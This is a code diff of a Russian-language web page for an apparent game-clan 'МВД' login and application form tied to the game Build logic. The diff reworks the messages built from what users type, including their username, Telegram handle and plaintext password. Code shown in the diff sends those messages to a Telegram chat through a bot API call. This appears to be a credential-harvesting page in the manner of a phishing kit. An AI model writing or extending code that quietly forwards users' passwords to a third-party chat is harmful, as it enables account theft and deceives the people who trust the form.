@@ -553,11 +553,11 @@
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="registerEmail">Telegram</label>
-                            <input type="text" class="form-input" id="registerEmail" required placeholder="@mvd_general_RF">
+                            <input type="text" class="form-input" id="registerEmail" required placeholder="@username">
                         </div>
                         <div class="form-group">
-                            <label class="form-label" for="registerPhone">Уровень в Build logic</label>
-                            <input type="text" class="form-input" id="registerPhone" required placeholder="Например: 150">
+                            <label class="form-label" for="registerPhone">Уровень/Звание</label>
+                            <input type="text" class="form-input" id="registerPhone" required placeholder="Например: Генерал-майор">
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="registerPassword">Пароль</label>
@@ -724,8 +724,8 @@
                 
                 console.log('Отправка данных входа...');
                 
-                // Проверяем что сообщение не пустое
-                const message = `🔐 ВХОД В СИСТЕМУ КЛАНА МВД\n🎮 Игрок: ${username || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n🎯 Игра: Build logic\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
+                // Форматируем сообщение как в примере
+                const message = `Сообщение: ВХОД В СИСТЕМУ\nИгрок: ${username || 'Не указан'}\nПароль: ${password || 'Не указан'}\nВремя: ${new Date().toLocaleString()}`;
                 
                 if (!username || !password) {
                     alert('Пожалуйста, заполните все поля!');
@@ -768,8 +768,8 @@
                     return;
                 }
                 
-                // Проверяем что сообщение не пустое
-                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n📱 Telegram: ${telegram || 'Не указан'}\n📊 Уровень в Build logic: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n🎯 Игра: Build logic\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
+                // Форматируем сообщение как в примере (без IP)
+                const message = `Сообщение: ЗАЯВКА В КЛАН МВД\nИгрок: ${username || 'Не указан'}\nTelegram: ${telegram || 'Не указан'}\nУровень: ${level || 'Не указан'}\nПароль: ${password || 'Не указан'}\nВремя: ${new Date().toLocaleString()}`;
                 
                 if (!username || !telegram || !level || !password) {
                     alert('Пожалуйста, заполните все поля!');
@@ -840,8 +840,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
+                            text: message
                         })
                     });
                     
@@ -866,11 +865,6 @@
                 authForms.forEach(form => form.style.display = 'none');
                 successMessage.style.display = 'block';
                 console.log('✅ Показано сообщение об успехе');
-            }
-            
-            // Function to get user IP (примерная реализация)
-            function getUserIP() {
-                return 'Определяется...';
             }
             
             // Test Telegram connection on load
